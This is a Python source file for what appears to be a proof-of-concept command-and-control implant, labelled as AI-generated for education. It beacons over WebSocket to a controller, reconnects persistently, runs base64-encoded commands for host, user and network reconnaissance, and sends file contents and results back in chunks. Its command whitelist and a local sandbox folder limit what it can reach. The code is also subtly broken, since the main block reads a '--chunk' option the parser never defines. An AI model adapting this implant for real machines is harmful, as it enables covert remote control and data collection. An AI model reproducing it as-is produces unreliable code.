"""
implant.py - WebSocket implant that supports job_id, base64-encoded cmd & args, chunked base64 results,
and a whitelist of cross-platform commands:
  echo, sysinfo, ls, readfile, whoami, hostname, net

Note: This is AI generated code provided as a proof of concept for educational purposes only.   

Usage:
    python implant.py --id myimplant001 --server ws://127.0.0.1:8765 --beacon 10 --chunk 1024

    If running with relay:
    python implant.py --id myimplant001 --server ws://127.0.0.1:9000 --beacon 10 --chunk 1024
"""
import asyncio
import json
import argparse
import platform
import os
import getpass
import socket
from pathlib import Path
import base64
import uuid
import logging
import shutil
import subprocess

import websockets

logging.basicConfig(level=logging.INFO, format="%(asctime)s %(levelname)s %(message)s")

SANDBOX = Path("./sandbox").resolve()
SANDBOX.mkdir(exist_ok=True)

DEFAULT_CHUNK_SIZE = 4096  # max chars per base64 chunk (applies to base64 string)

def safe_path_join(base: Path, rel: str):
    target = (base / rel).resolve()
    if not str(target).startswith(str(base)):
        raise PermissionError("outside sandbox")
    return target

# Command implementations (return bytes)
def cmd_echo(arg_bytes: bytes):
    return arg_bytes

def cmd_sysinfo(arg_bytes: bytes):
    info = {
        "platform": platform.platform(),
        "system": platform.system(),
        "machine": platform.machine(),
        "python": platform.python_version(),
        "cwd": os.getcwd()
    }
    return json.dumps(info, indent=2).encode()

def cmd_ls(arg_bytes: bytes):
    rel = arg_bytes.decode(errors="ignore").strip() or "."
    try:
        target = safe_path_join(SANDBOX, rel)
        if not target.exists():
            return f"error: path not found: {rel}".encode()
        if target.is_file():
            return str(target.name).encode()
        entries = []
        for p in sorted(target.iterdir()):
            t = "<DIR>" if p.is_dir() else "<FILE>"
            entries.append(f"{t}\t{p.name}")
        return ("\n".join(entries)).encode()
    except PermissionError as e:
        return (f"error: {e}").encode()

def cmd_readfile(arg_bytes: bytes):
    rel = arg_bytes.decode(errors="ignore").strip()
    if not rel:
        return b""
    try:
        target = safe_path_join(SANDBOX, rel)
        if not target.exists() or not target.is_file():
            return f"error: file not found: {rel}".encode()
        with open(target, "rb") as f:
            data = f.read()
        return data
    except PermissionError as e:
        return (f"error: {e}").encode()
    except Exception as e:
        return f"error: {e}".encode()

def cmd_whoami(arg_bytes: bytes):
    try:
        user = getpass.getuser()
    except Exception:
        user = os.environ.get("USER") or os.environ.get("USERNAME") or "<unknown>"
    return user.encode()

def cmd_hostname(arg_bytes: bytes):
    try:
        hn = socket.gethostname()
    except Exception:
        hn = "<unknown>"
    return hn.encode()

def cmd_net(arg_bytes: bytes):
    """
    Return network information:
     - Windows: ipconfig /all
     - Unix: ifconfig -a (if present) else ip addr (if present) else socket.getaddrinfo() fallback
    """
    try:
        system = platform.system().lower()
        if system.startswith("win"):
            cmd = ["ipconfig", "/all"]
        else:
            # prefer ifconfig, else ip
            if shutil.which("ifconfig"):
                cmd = ["ifconfig", "-a"]
            elif shutil.which("ip"):
                cmd = ["ip", "addr"]
            else:
                addrs = socket.getaddrinfo(socket.gethostname(), None)
                return ("\n".join(str(a) for a in addrs)).encode()
        # run the command, capture output
        proc = subprocess.run(cmd, capture_output=True)
        out = proc.stdout or proc.stderr or b""
        # ensure bytes
        return out if isinstance(out, (bytes, bytearray)) else str(out).encode()
    except Exception as e:
        return f"error: {e}".encode()

WHITELIST = {
    "echo": cmd_echo,
    "sysinfo": cmd_sysinfo,
    "ls": cmd_ls,
    "readfile": cmd_readfile,
    "whoami": cmd_whoami,
    "hostname": cmd_hostname,
    "net": cmd_net
}

async def run_implant(client_id, uri, beacon=10, chunk_size=DEFAULT_CHUNK_SIZE):
    while True:
        try:
            async with websockets.connect(uri) as ws:
                intro = {"type": "intro", "client_id": client_id}
                await ws.send(json.dumps(intro))
                logging.info("Connected to controller: %s", uri)

                async def heartbeat_loop():
                    while True:
                        await asyncio.sleep(beacon)
                        try:
                            await ws.send(json.dumps({"type": "heartbeat", "client_id": client_id}))
                        except Exception:
                            return
                hb = asyncio.create_task(heartbeat_loop())

                try:
                    async for raw in ws:
                        try:
                            msg = json.loads(raw)
                        except Exception:
                            logging.warning("Invalid JSON from controller: %s", raw)
                            continue
                        mtype = msg.get("type")
                        if mtype == "ack":
                            logging.info("Controller ack: %s", msg.get("msg"))
                            continue
                        if mtype == "command":
                            job_id = msg.get("job_id") or uuid.uuid4().hex
                            cmd_b64 = msg.get("cmd_b64", "")
                            arg_b64 = msg.get("arg_b64", "")
                            suggested_chunk = int(msg.get("chunk_size", chunk_size))
                            # decode command and arg
                            try:
                                cmd = base64.b64decode(cmd_b64.encode()).decode()
                            except Exception:
                                cmd = cmd_b64 if isinstance(cmd_b64, str) else ""
                            try:
                                arg_bytes = base64.b64decode(arg_b64.encode()) if arg_b64 else b""
                            except Exception:
                                arg_bytes = arg_b64.encode() if isinstance(arg_b64, str) else b""
                            logging.info("Received cmd=%s job=%s", cmd, job_id)

                            if cmd not in WHITELIST:
                                err = f"command not allowed: {cmd}".encode()
                                await send_chunked_result(ws, client_id, job_id, err, status="error", chunk_size=suggested_chunk)
                                continue

                            try:
                                output_bytes = WHITELIST[cmd](arg_bytes)
                            except Exception as e:
                                output_bytes = f"error executing {cmd}: {e}".encode()

                            await send_chunked_result(ws, client_id, job_id, output_bytes, status="ok", chunk_size=suggested_chunk)
                        else:
                            logging.info("Controller message: %s", msg)
                except Exception as e:
                    logging.info("Connection error: %s", e)
                finally:
                    hb.cancel()
        except Exception as e:
            logging.warning("Failed to connect to %s: %s -- retrying in 5s", uri, e)
            await asyncio.sleep(5)

async def send_chunked_result(ws, client_id, job_id, data_bytes: bytes, status="ok", chunk_size=DEFAULT_CHUNK_SIZE):
    # base64-encode bytes -> ascii string, then split into chunks (chunk_size is max chars per chunk)
    data_b64 = base64.b64encode(data_bytes).decode()
    if chunk_size <= 0:
        chunk_size = DEFAULT_CHUNK_SIZE
    pieces = [data_b64[i:i+chunk_size] for i in range(0, len(data_b64), chunk_size)]
    total = len(pieces)
    meta = {"client_id": client_id, "length_bytes": len(data_bytes), "total_chunks": total}
    for seq, piece in enumerate(pieces):
        msg = {
            "type": "result_chunk",
            "job_id": job_id,
            "seq": seq,
            "data_b64": piece,
            "final": seq == total - 1,
            "status": status,
            "meta": meta
        }
        await ws.send(json.dumps(msg))
        await asyncio.sleep(0.01)
    if total == 0:
        msg = {
            "type": "result_chunk",
            "job_id": job_id,
            "seq": 0,
            "data_b64": "",
            "final": True,
            "status": status,
            "meta": meta
        }
        await ws.send(json.dumps(msg))

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("--id", required=True, help="client id")
    parser.add_argument("--server", default="ws://127.0.0.1:8765", help="controller ws uri")
    parser.add_argument("--beacon", type=int, default=10, help="seconds between heartbeats")
    args = parser.parse_args()

    try:
        asyncio.run(run_implant(args.id, args.server, args.beacon, args.chunk))
    except KeyboardInterrupt:
        print("Implant stopped")
